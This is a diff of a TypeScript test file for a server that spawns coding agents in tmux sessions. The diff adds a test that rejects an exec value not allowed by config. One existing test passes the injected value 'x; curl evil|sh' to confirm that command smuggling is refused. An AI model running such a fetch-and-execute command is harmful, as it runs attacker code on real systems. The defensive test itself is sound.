@@ -78,7 +78,7 @@ it('POST /sessions with invalid exec returns 400 and spawns nothing', async () =
   });
   const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'x; curl evil|sh' }) });
   expect(res.status).toBe(400);
-  expect(await res.json()).toMatchObject({ error: 'invalid exec' });
+  expect(await res.json()).toMatchObject({ error: 'exec not allowed' });
   expect(await tmux.list()).toHaveLength(0);
 });
 
@@ -114,6 +114,21 @@ it('PATCH /missions/:id pauses (drops from active) and resumes', async () => {
   expect(missions.get('m1')?.state).toBe('paused');
   await app.request('/missions/m1', { method: 'PATCH', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ action: 'resume' }) });
   expect(missions.get('m1')?.state).toBe('active');
+});
+
+it('POST /sessions rejects an exec disallowed by config', async () => {
+  const db = openDb(':memory:'); db.prepare("INSERT INTO projects (id,slug,path) VALUES (1,'orca','/o')").run();
+  const tasks = new TaskStore(db); tasks.create({ id: 'orca-1', project_id: 1, title: 'X' });
+  const config = new ConfigStore(db); config.update({ allowedExecs: ['sonnet'] }); // only sonnet allowed
+  const tmux = new FakeTmuxDriver();
+  const app = createServer({
+    tasks, readiness: new Readiness(db), missions: new MissionStore(db), bus: new EventBus(),
+    engine: null as any, spawn: new SpawnService({ tmux, agents: new AgentStore(db) }), tmux,
+    project: { id: 1, path: '/o' }, fallback: { program: 'claude-code', model: 'sonnet' }, clock: new FakeClock(0), config,
+  });
+  const res = await app.request('/sessions', { method: 'POST', headers: { 'content-type': 'application/json' }, body: JSON.stringify({ taskId: 'orca-1', exec: 'codex:gpt-5.4' }) });
+  expect(res.status).toBe(400);
+  expect(await tmux.list()).toEqual([]);
 });
 
 it('GET /sessions/:name/stream survives a dead/missing session (empty pane)', async () => {
